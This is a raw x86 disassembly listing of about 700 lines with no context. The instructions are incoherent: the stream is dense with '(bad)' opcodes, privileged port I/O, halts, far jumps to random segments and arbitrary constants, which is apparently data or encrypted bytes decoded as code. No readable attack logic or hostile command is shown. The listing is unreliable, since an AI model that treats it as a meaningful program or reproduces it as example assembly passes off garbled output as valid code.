  413f9b:	mov    ebp,0xda148bf8
  413fa0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413fa1:	fild   QWORD PTR [edx+0x3fd5249b]
  413fa7:	loop   0x413fc1
  413fa9:	cmp    DWORD PTR ds:0x45861510,esp
  413faf:	mov    esp,eax
  413fb1:	imul   ebp,DWORD PTR [edi-0x75],0x226ff2be
  413fb8:	sbb    dh,BYTE PTR [ebp+0x53]
  413fbb:	mov    WORD PTR ds:0xe75346e1,ds
  413fc1:	aas    
  413fc2:	mov    ds:0xcc0f5d46,eax
  413fc7:	or     BYTE PTR [eax],bl
  413fc9:	mov    cl,0xb0
  413fcb:	aaa    
  413fcc:	inc    edi
  413fcd:	out    dx,eax
  413fce:	fld    TBYTE PTR ds:0xba17cf6
  413fd4:	sbb    edi,DWORD PTR [ecx+0x2e]
  413fd7:	sbb    BYTE PTR [edx-0x7c8a0085],dh
  413fdd:	cli    
  413fde:	pop    es
  413fdf:	je     0x413f74
  413fe1:	mov    al,0x1
  413fe3:	enter  0x1a28,0xcc
  413fe7:	inc    edx
  413fe8:	xchg   BYTE PTR [esi-0x43d8edc3],dl
  413fee:	stos   BYTE PTR es:[edi],al
  413fef:	xchg   DWORD PTR [edx],edi
  413ff1:	sahf   
  413ff2:	pop    eax
  413ff3:	mov    ebp,0xc51defff
  413ff8:	mov    al,ds:0xc669fe1e
  413ffd:	enter  0xe8ba,0xe
  414001:	pop    eax
  414002:	or     DWORD PTR [esp+ecx*4],ecx
  414005:	xor    eax,0xd9584a4f
  41400a:	loop   0x414069
  41400c:	adc    DWORD PTR [esi],ebp
  41400e:	repnz imul ecx,DWORD PTR [ebp+0x42f9254b],0x50b17440
  414019:	or     esi,DWORD PTR [esi]
  41401b:	mov    ah,BYTE PTR [esp+eax*1]
  41401e:	or     BYTE PTR [esi+eax*1+0x6d1a1361],dh
  414025:	outs   dx,BYTE PTR ds:[esi]
  414026:	mov    bl,0xf2
  414028:	push   cs
  414029:	jg     0x414052
  41402b:	dec    edi
  41402c:	mov    eax,eax
  41402e:	jo     0x413fd9
  414030:	aad    0xf4
  414032:	fsub   DWORD PTR [eax]
  414034:	adc    eax,0xaea8c330
  414039:	or     eax,0x6a91ab27
  41403e:	cmp    ah,cl
  414040:	push   ebx
  414041:	ins    DWORD PTR es:[edi],dx
  414042:	add    BYTE PTR [ebp-0x7e],bh
  414045:	lea    ebp,[eax+0x7c]
  414048:	cmp    DWORD PTR [edi+0x7e4e44c3],eax
  41404e:	test   eax,0x5a9e88d5
  414053:	push   edi
  414054:	ret    
  414055:	pop    esi
  414056:	loope  0x4140d5
  414058:	jp     0x41406c
  41405a:	mov    ecx,DWORD PTR es:[eax-0x2cc6fe24]
  414061:	scas   eax,DWORD PTR es:[edi]
  414062:	or     eax,0xd2c550aa
  414067:	mov    dh,0x19
  414069:	cwde   
  41406a:	leave  
  41406b:	adc    bh,bl
  41406d:	xor    al,0xcb
  41406f:	jo     0x41403c
  414071:	mov    esi,0x126a8287
  414076:	adc    ch,dh
  414078:	add    edx,DWORD PTR [ebp-0x7a]
  41407b:	pop    esp
  41407c:	xchg   esi,eax
  41407d:	jle    0x41402c
  41407f:	mov    BYTE PTR [eax-0xd],al
  414082:	imul   ebp,ecx,0xea75af72
  414088:	dec    esi
  414089:	ds inc eax
  41408b:	dec    edx
  41408c:	add    al,0x15
  41408f:	in     al,0xec
  414091:	xchg   ebx,eax
  414092:	test   DWORD PTR [edi+0xf60e6a2],eax
  414098:	and    al,0x38
  41409a:	data16 (bad) 
  41409c:	test   al,0x38
  41409e:	jge    0x4140a7
  4140a0:	out    dx,eax
  4140a1:	(bad)  
  4140a2:	mov    dh,0x1c
  4140a4:	mul    DWORD PTR [eax-0x54]
  4140a7:	jl     0x414109
  4140a9:	out    dx,al
  4140aa:	je     0x4140cb
  4140ac:	sub    al,0xeb
  4140ae:	sti    
  4140af:	xor    eax,0xb4b89e84
  4140b4:	je     0x414085
  4140b6:	jg     0x4140af
  4140b8:	or     bh,BYTE PTR [edi+0x2c]
  4140bb:	xchg   BYTE PTR ds:0x41acd183,cl
  4140c1:	push   0xffffffb7
  4140c3:	out    dx,al
  4140c4:	daa    
  4140c5:	dec    esi
  4140c6:	ret    0xda1
  4140c9:	retf   
  4140ca:	cli    
  4140cb:	lock dec edx
  4140cd:	sar    BYTE PTR ss:[ecx+0x53269d4c],0x33
  4140d5:	mov    esp,0x9ece8d4a
  4140da:	sub    BYTE PTR [esi+edx*2+0x699e761b],bl
  4140e1:	mov    esi,0x582ab8fd
  4140e6:	loop   0x4140cd
  4140e8:	(bad)  
  4140e9:	arpl   WORD PTR ds:0x705627f,bx
  4140ef:	repnz pop ebx
  4140f1:	cmp    bl,BYTE PTR [eax+0x29b43a5d]
  4140f7:	cmp    DWORD PTR [ecx+0x26],ebx
  4140fa:	(bad)  
  4140fb:	jmp    0x41413f
  4140fd:	je     0x414108
  4140ff:	and    esi,DWORD PTR [ecx-0x44]
  414102:	fstp   TBYTE PTR [esi-0x6d44505c]
  414108:	push   ss
  414109:	xchg   ebp,eax
  41410a:	adc    DWORD PTR [edi+ebx*1-0x4043bf68],ebp
  414111:	inc    edx
  414112:	in     eax,0x71
  414114:	std    
  414115:	pushf  
  414116:	mov    esi,0x1d6e95c5
  41411b:	ja     0x4140d2
  41411d:	bound  ebp,QWORD PTR [eax-0xabcb83]
  414123:	stos   DWORD PTR es:[edi],eax
  414124:	fstp   TBYTE PTR [ebx-0xa]
  414127:	hlt    
  414128:	xor    esi,DWORD PTR [eax+0x11]
  41412b:	test   DWORD PTR [ecx-0x5],0x737f997
  414132:	outs   dx,BYTE PTR ds:[esi]
  414133:	lfs    eax,FWORD PTR [ebx+ebx*1-0x38cf5d96]
  41413b:	int    0xc2
  41413d:	inc    ebx
  41413e:	popa   
  41413f:	fcmovu st,st(1)
  414141:	and    al,0x69
  414143:	jbe    0x4140d5
  414145:	aas    
  414146:	js     0x414164
  414148:	call   0x72b22cdc
  41414d:	fs push edi
  41414f:	and    ah,BYTE PTR [edx]
  414151:	add    bl,BYTE PTR [ebp+0x64086292]
  414157:	mov    WORD PTR [edi+0x7a51fb82],ds
  41415d:	and    DWORD PTR [esi+edx*4+0x5cde66dd],ebp
  414164:	xchg   ebp,eax
  414165:	loope  0x41419f
  414167:	push   eax
  414168:	xchg   edx,eax
  414169:	in     al,dx
  41416a:	inc    ebp
  41416b:	fld    TBYTE PTR ds:0x7b51e3c3
  414171:	xchg   edx,eax
  414172:	sub    al,bl
  414174:	xor    edi,ebx
  414176:	and    cl,BYTE PTR [ebx]
  414178:	in     al,dx
  414179:	lock pusha 
  41417b:	push   eax
  41417c:	lock pusha 
  41417e:	lods   eax,DWORD PTR ds:[esi]
  41417f:	out    0xb7,al
  414181:	fwait
  414182:	inc    eax
  414183:	cmp    ax,bp
  414186:	lds    edx,FWORD PTR [ebx-0x27]
  414189:	fmul   DWORD PTR ds:0x9a8c12de
  41418f:	add    BYTE PTR [esi+ebp*2+0x6c],dh
  414193:	mov    bh,0xb
  414195:	push   ds
  414196:	mov    dh,0x7f
  414198:	xor    BYTE PTR [ebx],dh
  41419a:	call   0xdbb658b4
  41419f:	push   cs
  4141a0:	pop    es
  4141a1:	mov    eax,cs
  4141a3:	jbe    0x4141f2
  4141a5:	cs xchg edi,eax
  4141a7:	cmp    DWORD PTR [esi-0x13],edi
  4141aa:	jne    0x4141dc
  4141ac:	xchg   BYTE PTR [ebx-0x73],dl
  4141af:	mov    eax,0xfe99167d
  4141b4:	pushf  
  4141b5:	mov    ecx,0x558cc544
  4141ba:	xor    BYTE PTR [ecx-0x34],dh
  4141bd:	or     edx,DWORD PTR [esi-0x17]
  4141c0:	(bad)  
  4141c1:	test   al,0x2e
  4141c3:	mov    ds:0xff470c31,al
  4141c8:	dec    ebp
  4141c9:	xchg   edi,eax
  4141ca:	ret    
  4141cb:	stos   BYTE PTR es:[edi],al
  4141cc:	inc    edi
  4141cd:	mov    cl,0x40
  4141cf:	call   0x6841:0xce05b406
  4141d6:	lahf   
  4141d7:	inc    ecx
  4141d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4141d9:	and    BYTE PTR [ecx+0x1e],0x2b
  4141dd:	hlt    
  4141de:	and    eax,0xc62d393f
  4141e3:	test   eax,0x65957e15
  4141e8:	in     eax,dx
  4141e9:	fstp   QWORD PTR [edi+0x5fa734da]
  4141ef:	std    
  4141f0:	stos   BYTE PTR es:[edi],al
  4141f1:	dec    ebx
  4141f2:	(bad)  [edi+0x15]
  4141f5:	and    DWORD PTR [esi+0x1c],eax
  4141f8:	mov    ah,0x5d
  4141fa:	fcmovu st,st(4)
  4141fd:	dec    ecx
  4141fe:	push   ebp
  4141ff:	rcr    DWORD PTR [esi+0x71],cl
  414202:	sti    
  414203:	test   BYTE PTR [eax+0x653e1e7c],0xb1
  41420a:	and    DWORD PTR [esi],ebx
  41420c:	pop    esi
  41420d:	adc    ecx,0x2a8e9168
  414213:	pop    ecx
  414214:	adc    esp,DWORD PTR [ebx+0x20f15827]
  41421a:	or     eax,0x959f489d
  41421f:	sbb    edx,edi
  414221:	xchg   esi,eax
  414222:	push   ebp
  414223:	jecxz  0x41423e
  414225:	test   al,0x5a
  414227:	xor    dl,bh
  414229:	lds    edi,FWORD PTR [edi]
  41422b:	retf   0xcfb4
  41422e:	test   al,0x97
  414230:	int    0x69
  414232:	sbb    eax,0xbb3c6bf9
  414237:	cs add al,0xb2
  41423a:	or     ecx,DWORD PTR [edi]
  41423c:	push   0xf1cad464
  414241:	cmp    al,0xc1
  414243:	ins    BYTE PTR es:[edi],dx
  414244:	cmp    DWORD PTR [edx+0x48],ecx
  414247:	adc    BYTE PTR [ebx],0xc
  41424a:	pop    es
  41424b:	fisub  DWORD PTR [eax+0xd]
  41424e:	dec    ebp
  41424f:	sub    DWORD PTR [edi],ebp
  414251:	shr    DWORD PTR [edx],1
  414253:	inc    edx
  414254:	std    
  414255:	push   eax
  414256:	stc    
  414257:	sub    al,0xa3
  414259:	add    esp,esi
  41425b:	in     al,dx
  41425c:	pop    ds
  41425d:	jecxz  0x414257
  41425f:	adc    BYTE PTR [esi+0x3d5df6d1],cl
  414265:	test   BYTE PTR [eax-0x5d934c3b],ah
  41426b:	dec    edx
  41426c:	adc    edi,DWORD PTR [eax]
  41426e:	pop    ds
  41426f:	jle    0x414278
  414271:	stc    
  414272:	imul   esi,DWORD PTR [edx],0xaae4c4b4
  414278:	and    eax,ebp
  41427a:	sub    BYTE PTR [eax+esi*8+0x6e3bcf05],ch
  414281:	pop    ecx
  414282:	into   
  414283:	mov    cl,cl
  414285:	rcl    BYTE PTR [edi-0x5a52ba50],1
  41428b:	push   edx
  41428c:	in     eax,dx
  41428d:	arpl   WORD PTR [esi],bp
  41428f:	pushf  
  414290:	mov    esp,0xa3e7eefa
  414295:	stos   DWORD PTR es:[edi],eax
  414296:	mov    cl,0x22
  414298:	cmp    BYTE PTR [edx+0x65],dh
  41429b:	pusha  
  41429c:	ret    0xd046
  41429f:	jl     0x41426d
  4142a1:	xlat   BYTE PTR ds:[ebx]
  4142a2:	clc    
  4142a3:	lods   eax,DWORD PTR ds:[esi]
  4142a4:	out    0x9e,al
  4142a6:	shl    edx,1
  4142a8:	loope  0x414328
  4142aa:	shl    BYTE PTR [eax],cl
  4142ac:	dec    edx
  4142ad:	mov    bl,0x16
  4142af:	daa    
  4142b0:	lock mov esp,0x35ba50b8
  4142b6:	mov    cl,0xd5
  4142b8:	add    DWORD PTR [edx-0x4073bdb1],esi
  4142be:	sbb    eax,0x75
  4142c1:	iret   
  4142c2:	and    dl,0x9f
  4142c5:	popa   
  4142c6:	dec    edx
  4142c7:	stos   BYTE PTR es:[edi],al
  4142c8:	(bad)  
  4142ca:	(bad)  
  4142cb:	mov    edx,0x992d22ca
  4142d0:	inc    ecx
  4142d1:	rcr    BYTE PTR [esi-0x3afeb289],1
  4142d7:	jp     0x41427c
  4142d9:	int3   
  4142da:	stos   BYTE PTR es:[edi],al
  4142db:	retf   0x1fed
  4142de:	out    0x56,al
  4142e0:	cmp    ebx,ebp
  4142e2:	and    al,0x1f
  4142e4:	xor    BYTE PTR gs:[ecx+0x79],dl
  4142e8:	aad    0x31
  4142ea:	ror    DWORD PTR [esi],0x8c
  4142ed:	mov    bl,0x84
  4142ef:	inc    edi
  4142f0:	fadd   DWORD PTR [ecx-0x16]
  4142f3:	neg    DWORD PTR [esi]
  4142f5:	and    al,0x69
  4142f7:	ins    DWORD PTR es:[edi],dx
  4142f8:	jl     0x414376
  4142fa:	xchg   DWORD PTR [edi+0x6e13417f],ecx
  414300:	sub    eax,0xe40faf14
  414305:	ret    0xf15
  414308:	js     0x414363
  41430a:	mov    edx,0x572130d1
  41430f:	jmp    0xae2a05fa
  414314:	rcl    DWORD PTR [edi+0x12c4f821],1
  41431a:	add    DWORD PTR [ecx-0x48],ebx
  41431d:	fbld   TBYTE PTR [esi+0x16]
  414320:	xor    dl,BYTE PTR [ecx+0x3c078eb0]
  414326:	mov    bl,0x4d
  414328:	push   ds
  414329:	stos   DWORD PTR es:[edi],eax
  41432a:	pushf  
  41432b:	call   0x8221acfd
  414330:	push   edi
  414331:	or     DWORD PTR [edx],esp
  414333:	sub    al,0xe7
  414335:	retf   0x6550
  414338:	xor    DWORD PTR [edx],0x41
  41433b:	dec    esi
  41433c:	pop    ds
  41433d:	push   cs
  41433e:	mov    ah,0xa1
  414340:	jns    0x4142f4
  414342:	jns    0x414374
  414344:	jne    0x4143c4
  414346:	jmp    0xe12b:0xdc2715af
  41434d:	jge    0x4142d2
  41434f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414350:	and    BYTE PTR [eax],bl
  414352:	mov    WORD PTR [eax-0x7a],es
  414355:	inc    edi
  414356:	fsubr  QWORD PTR [ebp+0xc86c38c]
  41435c:	mov    esp,0x8e519768
  414361:	sbb    eax,0x5ab15da1
  414366:	inc    esi
  414367:	cli    
  414368:	imul   ebx,DWORD PTR [esi],0xffffffdb
  41436b:	jne    0x4143d4
  41436d:	cmp    DWORD PTR [ebx],0xffffffb5
  414370:	adc    DWORD PTR [ebp-0x6ebd59f4],esi
  414376:	scas   al,BYTE PTR es:[edi]
  414377:	dec    ebp
  414378:	in     al,dx
  414379:	in     eax,0xf0
  41437b:	sbb    DWORD PTR [ecx+0x7b2f0544],ebx
  414381:	mov    ecx,0xdaa2f9
  414386:	fs jecxz 0x4143fd
  414389:	repz add DWORD PTR [eax],esp
  41438c:	cs mov edi,0xd79ba710
  414392:	aas    
  414393:	mov    dl,0x1c
  414395:	mov    eax,0x9724eb11
  41439a:	loope  0x414369
  41439c:	mov    ebx,0xae274e0c
  4143a1:	adc    BYTE PTR cs:[ebx-0x1e],0xba
  4143a6:	repnz mov bl,0xf8
  4143a9:	enter  0x10e5,0x42
  4143ad:	stos   BYTE PTR es:[edi],al
  4143ae:	push   edx
  4143af:	les    esp,FWORD PTR [ebx-0x500201d6]
  4143b5:	mov    ebx,0x6c96d92d
  4143ba:	dec    ebp
  4143bb:	xchg   ebx,eax
  4143bc:	jns    0x414369
  4143be:	mov    ch,BYTE PTR [esi]
  4143c0:	sahf   
  4143c1:	dec    esp
  4143c2:	adc    al,0xa3
  4143c4:	push   eax
  4143c5:	popf   
  4143c6:	loop   0x414373
  4143c8:	repz clc 
  4143ca:	jae    0x4143f3
  4143cc:	add    eax,0xce30e012
  4143d1:	loop   0x4143d6
  4143d3:	outs   dx,BYTE PTR ds:[esi]
  4143d4:	(bad)  
  4143d5:	cli    
  4143d6:	das    
  4143d7:	clc    
  4143d8:	inc    ebx
  4143d9:	hlt    
  4143da:	adc    bl,0x4
  4143dd:	fisub  WORD PTR [edi]
  4143df:	push   ss
  4143e0:	xchg   esi,eax
  4143e1:	pop    ecx
  4143e2:	aam    0x5c
  4143e4:	dec    ebx
  4143e5:	or     cl,BYTE PTR [ebp-0x4edb8c67]
  4143eb:	dec    eax
  4143ec:	cmc    
  4143ed:	dec    ecx
  4143ee:	pop    bp
  4143f0:	dec    BYTE PTR [ebx-0x41f07201]
  4143f6:	add    al,BYTE PTR [edx-0x5797b0bf]
  4143fc:	push   ds
  4143fd:	sbb    al,0xbd
  4143ff:	in     eax,0x5b
  414401:	cmp    dh,al
  414403:	or     DWORD PTR [edx+ecx*8+0x20],eax
  414407:	sbb    DWORD PTR [ecx-0x18da9b5],0x37
  41440e:	mov    ebx,esp
  414410:	push   0x71ced24e
  414415:	cmp    dl,bl
  414417:	mov    ds:0x4f62395e,eax
  41441c:	es pop ebx
  41441e:	test   BYTE PTR [edx+0x723795b2],al
  414424:	xchg   DWORD PTR [ebx-0x723863e9],esp
  41442a:	and    DWORD PTR [edx-0x26016097],esp
  414430:	push   0xeafca26e
  414435:	and    BYTE PTR [edx],bl
  414437:	out    0x4a,eax
  414439:	jmp    0x1ef0:0x46099de3
  414440:	sub    DWORD PTR ds:0xcf849f3c,edx
  414446:	cmp    eax,0x7ca12f5e
  41444b:	fistp  QWORD PTR [ebx+0x13cfca34]
  414451:	ret    
  414452:	jnp    0x4143e8
  414454:	push   0xffffffef
  414456:	mov    es,ebx
  414458:	or     esi,edi
  41445a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41445b:	and    dh,BYTE PTR [edx+0x62]
  41445e:	add    dl,bl
  414460:	jmp    0xdbc0:0x127ba8b9
  414467:	div    edi
  414469:	xlat   BYTE PTR ds:[ebx]
  41446a:	mov    ch,0x81
  41446c:	ins    BYTE PTR es:[edi],dx
  41446d:	jmp    0xd6a8:0x1dc79e33
  414474:	mov    dh,0xea
  414476:	xor    BYTE PTR [edi+ebx*8+0x140b0051],dl
  41447d:	in     eax,0x35
  41447f:	scas   eax,DWORD PTR es:[edi]
  414480:	add    esp,DWORD PTR [ecx]
  414482:	mov    tr0,esi
  414485:	jle    0x414447
  414487:	mov    dl,0x81
  414489:	mov    ds:0xd804267e,al
  41448e:	pop    ss
  41448f:	jle    0x4144d3
  414491:	add    al,0xc2
  414493:	pusha  
  414494:	iret   
  414495:	sar    BYTE PTR [ebx-0x22],0x3
  414499:	ins    DWORD PTR es:[edi],dx
  41449a:	jl     0x4144b5
  41449c:	push   0x52
  41449e:	add    BYTE PTR [edx],0x21
  4144a1:	ret    
  4144a2:	daa    
  4144a3:	(bad)  [esi+0x442fed6e]
  4144a9:	pop    ds
  4144aa:	int3   
  4144ab:	jp     0x4144a5
  4144ad:	jge    0x4144be
  4144af:	cmp    al,0xb7
  4144b1:	cmp    bh,BYTE PTR [edx]
  4144b3:	push   edi
  4144b4:	push   0xeb7e54b6
  4144b9:	icebp  
  4144ba:	or     eax,0x7693e159
  4144bf:	ror    edx,cl
  4144c1:	mov    esi,0xf4eccd02
  4144c6:	out    0x61,eax
  4144c8:	pop    ebx
  4144c9:	test   BYTE PTR [edi],0xa2
  4144cc:	mov    cl,0xb2
  4144ce:	inc    esi
  4144cf:	je     0x414468
  4144d1:	lock mov ecx,0x39bf07b8
  4144d7:	and    esi,DWORD PTR [esi]
  4144d9:	mov    ds:0xf62c0941,eax
  4144de:	arpl   cx,ax
  4144e0:	fiadd  WORD PTR [ebx]
  4144e2:	popa   
  4144e3:	(bad)  
  4144e4:	jp     0x414480
  4144e6:	xchg   edi,eax
  4144e7:	int3   
  4144e8:	dec    eax
  4144e9:	imul   edx
  4144eb:	jle    0x4144ae
  4144ed:	sahf   
  4144ee:	pop    ds
  4144ef:	fwait
  4144f0:	sub    al,ch
  4144f2:	push   edi
  4144f3:	aam    0x4b
  4144f5:	xchg   ebx,eax
  4144f6:	clc    
  4144f7:	pop    edi
  4144f8:	shl    BYTE PTR [ecx+ebp*1],cl
  4144fb:	in     al,0xfc
  4144fd:	test   esp,esp
  4144ff:	es (bad) 
  414501:	dec    DWORD PTR [ecx]
  414503:	sti    
  414504:	sub    eax,0xe0a0e76e
  414509:	mov    ah,0x2d
  41450b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41450c:	cwde   
  41450d:	(bad)  
  41450e:	cmp    ah,BYTE PTR [esp+ecx*4+0x15dd8f11]
  414515:	repnz xor al,0x49
  414518:	add    al,0x21
  41451a:	pop    esi
  41451b:	aaa    
  41451c:	sub    bh,0x88
  41451f:	sbb    esi,DWORD PTR [edx+0x55]
  414522:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414523:	push   es
  414524:	bt     DWORD PTR [eax],ebx
  414527:	test   eax,0x8acf13a9
  41452c:	shl    DWORD PTR [eax-0x30],0xc8
  414530:	data16 hlt 
  414532:	mov    ds:0xf92890a6,eax
  414537:	punpckhbw mm5,QWORD PTR [eax]
  41453a:	push   DWORD PTR [eax]
  41453c:	adc    cl,BYTE PTR [edi]
  41453e:	mov    bh,0x36
  414540:	aam    0x5d
  414542:	push   esp
  414543:	push   esi
  414544:	add    edx,DWORD PTR [edi+0x2d165c17]
  41454a:	mov    ecx,0xe240d9ee
  41454f:	rol    esi,1
  414551:	(bad)  
  414552:	and    DWORD PTR [ecx-0x7e45ca24],ebp
  414558:	mov    WORD PTR [ebx+0x71baf20a],?
  41455e:	cmp    BYTE PTR [ecx],ah
  414560:	adc    eax,0xe0448ce6
  414565:	adc    BYTE PTR [eax-0x11db971],dh
  41456b:	mov    dh,BYTE PTR [eax-0x74958507]
  414571:	mov    esp,edx
  414573:	push   ecx
  414574:	ins    BYTE PTR es:[edi],dx
  414575:	sti    
  414576:	(bad)  
  414577:	dec    edx
  414578:	test   al,0xf2
  41457a:	jmp    0xafc4:0x1a610125
  414581:	ins    BYTE PTR es:[edi],dx
  414582:	aaa    
  414583:	xchg   esi,eax
  414584:	xor    eax,0x19248f97
  414589:	stc    
  41458a:	stos   DWORD PTR es:[edi],eax
  41458b:	xchg   edx,eax
  41458c:	adc    BYTE PTR [eax-0x591389bb],dh
  414592:	sub    DWORD PTR [edi-0x2a],ecx
  414595:	ins    DWORD PTR es:[edi],dx
  414596:	retf   
  414597:	fwait
  414598:	mov    bl,ah
  41459a:	out    0xb7,al
  41459c:	xor    DWORD PTR [ecx+ebp*4+0xf],ebx
  4145a0:	push   es
  4145a1:	leave  
  4145a2:	jecxz  0x4145f6
  4145a4:	fcmovnbe st,st(7)
  4145a6:	xchg   edx,eax
  4145a7:	push   ecx
  4145a8:	jmp    0x1b9:0xb66b17f2
  4145af:	push   0x855d6b0c
  4145b4:	jmp    0xd7f5:0xb62c29d7
  4145bb:	mov    ah,dh
  4145bd:	leave  
  4145be:	push   cs
  4145bf:	push   eax
  4145c0:	ficomp DWORD PTR [ebp-0x6547aeaa]
  4145c6:	iret   
  4145c7:	jno    0x41461a
  4145c9:	dec    ecx
  4145ca:	sub    eax,0xc8c5f135
  4145cf:	arpl   sp,sp
  4145d1:	or     dh,BYTE PTR [ebx+ecx*8-0x873bc53]
  4145d8:	mov    edx,ecx
  4145da:	fstp   DWORD PTR [esi+0x7760c7a8]
  4145e0:	lds    ecx,FWORD PTR [ecx+0x24]
  4145e3:	and    BYTE PTR [ebp-0x77],dh
  4145e6:	adc    esi,DWORD PTR [ecx+0x30]
  4145e9:	push   ecx
  4145ea:	mov    edi,0xc4f438a1
  4145ef:	bound  esp,QWORD PTR [edx]
  4145f1:	jno    0x414668
  4145f3:	or     al,0x63
  4145f5:	xor    BYTE PTR [edx+0x3f],ah
  4145f8:	add    DWORD PTR ds:[ecx+edx*8+0x6602e2a4],ecx
  414600:	imul   ebx,DWORD PTR [ecx],0x56
  414603:	test   al,0x76
  414605:	ret    0x72e5
  414608:	add    bl,ah
  41460a:	dec    ecx
  41460b:	dec    ebx
  41460c:	imul   BYTE PTR [eax-0x4f9e299]
  414612:	jo     0x414660
  414614:	mov    ebp,0x8c38b4e2
  414619:	push   esi
  41461a:	xchg   esp,eax
  41461b:	mov    dl,0xf
  41461d:	lds    esi,FWORD PTR [eax-0x7670c952]
  414623:	(bad)  
  414624:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414625:	mov    edx,0x3760528f
  41462a:	imul   esp,DWORD PTR [eax-0x506eaf45],0x575e9f65
  414634:	lods   eax,DWORD PTR ds:[esi]
  414635:	xchg   ebx,eax
  414636:	cli    
  414637:	mov    es,WORD PTR [ebx-0x5be2ca8f]
  41463d:	aas    
  41463e:	pushf  
  41463f:	rcl    al,1
  414641:	add    BYTE PTR [eax],bh
  414643:	test   DWORD PTR [edx+0x78],0xecee3e98
  41464a:	jnp    0x414644
  41464c:	dec    esp
  41464d:	bound  eax,QWORD PTR [eax]
  41464f:	jne    0x41468d
  414651:	test   esi,esp
  414653:	(bad)  
  414654:	nop
  414655:	clc    
  414656:	imul   ebp
  414658:	push   ebp
  414659:	jle    0x4146a1
  41465b:	inc    ebp
  41465c:	cmp    eax,0x25f6eef2
  414661:	stc    
  414662:	lods   eax,DWORD PTR ds:[esi]
  414663:	mov    dl,0xd
  414665:	add    DWORD PTR [ebx+eiz*2+0x26aa32bd],edi
  41466c:	mov    bh,0xf0
  41466e:	mov    ebx,0xdfcee627
  414673:	pop    edx
  414674:	daa    
  414675:	jns    0x41469f
  414677:	sbb    BYTE PTR ds:0xeaa3e7ed,dh
  41467d:	int3   
  41467e:	arpl   WORD PTR [eax-0x246ba1cc],bx
  414684:	scas   eax,DWORD PTR es:[edi]
  414685:	adc    BYTE PTR [ecx+0x4fb7b2d5],al
  41468b:	std    
  41468c:	and    eax,0x77cf8945
  414691:	push   ebx
  414692:	sbb    eax,0xdb3c64db
  414697:	fisub  WORD PTR [ebx+0x19ada03d]
  41469d:	xchg   ecx,ebx
  41469f:	and    eax,0x5f608b36
  4146a4:	aas    
  4146a5:	icebp  
  4146a6:	test   ebx,ebp
  4146a8:	mov    dh,0x93
  4146aa:	(bad)  
  4146ab:	arpl   WORD PTR [esi+0x3f294801],si
  4146b1:	fst    QWORD PTR [esi-0x1e582268]
  4146b7:	and    DWORD PTR [edi+ebp*4],edi
  4146ba:	fild   WORD PTR [esi+0x184c85d8]
  4146c0:	push   ds
  4146c1:	pushw  0x862a
  4146c5:	jecxz  0x414670
  4146c7:	sbb    al,BYTE PTR [eax]
  4146c9:	mov    dl,0x9d
  4146cb:	xchg   edx,eax
  4146cc:	fnstsw WORD PTR [edi-0x26]
  4146cf:	cmp    eax,0xb447a076
  4146d4:	sub    eax,0x897f2885
  4146d9:	xor    al,bl
  4146db:	inc    edi
  4146dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146dd:	bound  esp,QWORD PTR [edi+0x7c995551]
  4146e3:	xlat   BYTE PTR ds:[ebx]
  4146e4:	push   esp
  4146e5:	pop    edi
  4146e6:	popa   
  4146e7:	jb     0x4146d4
  4146e9:	xchg   BYTE PTR [esp+ebp*2-0x1ae69765],ch
  4146f0:	jo     0x41472f
  4146f2:	imul   esp,ebp,0x516faa64
  4146f8:	out    dx,eax
  4146f9:	xchg   edx,eax
  4146fa:	(bad)  
  4146fc:	adc    DWORD PTR [edi+0x4f2cdef2],0xffffffbd
  414703:	aas    
  414704:	dec    edi
  414705:	std    
  414706:	retf   
  414707:	int    0x4d
  414709:	mov    esi,esi
  41470b:	fnsave cs:[eax-0x295c54c9]
  414712:	sbb    eax,0xe3a62ffc
  414717:	cld    
  414718:	das    
  414719:	jle    0x414768
  41471b:	lods   al,BYTE PTR ds:[esi]
  41471c:	daa    
  41471d:	fiadd  DWORD PTR [edi+0x439e7971]
  414723:	in     al,dx
  414724:	cmp    ecx,DWORD PTR [ecx+0x11]
  414727:	ficomp DWORD PTR [esi*2-0x77a0715f]
  41472f:	test   esi,ebx
  414731:	pop    esi
  414732:	adc    BYTE PTR [ebp-0x3f3ab940],dh
  414738:	mov    cl,0x21
  41473a:	outs   dx,BYTE PTR ds:[esi]
  41473b:	xchg   edi,eax
  41473c:	rcr    dh,cl
  41473e:	sbb    al,0xac
  414740:	mov    esp,0x68af3747
  414745:	sbb    DWORD PTR [edx+0x30],esp
  414748:	mov    esp,0x1c2030ea
  41474d:	and    esi,DWORD PTR [esi]
  41474f:	cmp    al,dh
  414751:	mov    BYTE PTR [edi],al
  414753:	pop    eax
  414754:	retf   0xf4fe
  414757:	push   esi
  414758:	inc    esi
  414759:	fwait
  41475a:	dec    ecx
  41475b:	push   ss
  41475c:	data16 sub bh,BYTE PTR [ecx]
  41475f:	retf   0x8b4b
  414762:	add    esi,ebx
  414764:	jno    0x414784
  414766:	cld    
  414767:	pop    ebx
  414768:	in     al,0xd
  41476a:	sti    
  41476b:	inc    esp
  41476c:	mov    DWORD PTR [ebx],ebx
  41476e:	hlt    
  41476f:	leave  
  414770:	es xor eax,0xbefb099f
  414776:	les    edx,FWORD PTR [esi]
  414778:	push   eax
  414779:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41477a:	(bad)  
  41477b:	cmp    ebx,DWORD PTR [ebx]
  41477d:	jmp    0xae40aafd
  414782:	outs   dx,BYTE PTR ds:[esi]
  414783:	push   ebx
  414784:	xchg   ecx,eax
  414785:	mov    eax,0xbfa21490
  41478a:	rcl    BYTE PTR [ebx],1
  41478c:	mov    bh,0x95
  41478e:	jbe    0x4147ca
  414790:	popf   
  414791:	sar    DWORD PTR [esi+0x28523c89],0xdb
  414798:	mov    edx,0x2e504361
  41479d:	aas    
  41479e:	in     eax,0x3a
  4147a0:	and    ecx,eax
  4147a2:	loope  0x41472a
  4147a4:	rcr    BYTE PTR [edx+0x53],0xe
  4147a8:	in     al,dx
  4147a9:	xchg   DWORD PTR [ecx],edx
  4147ab:	popa   
  4147ac:	in     al,0x2
  4147ae:	cmp    BYTE PTR [ebx-0x3f1ae419],0xeb
  4147b5:	mov    eax,esp
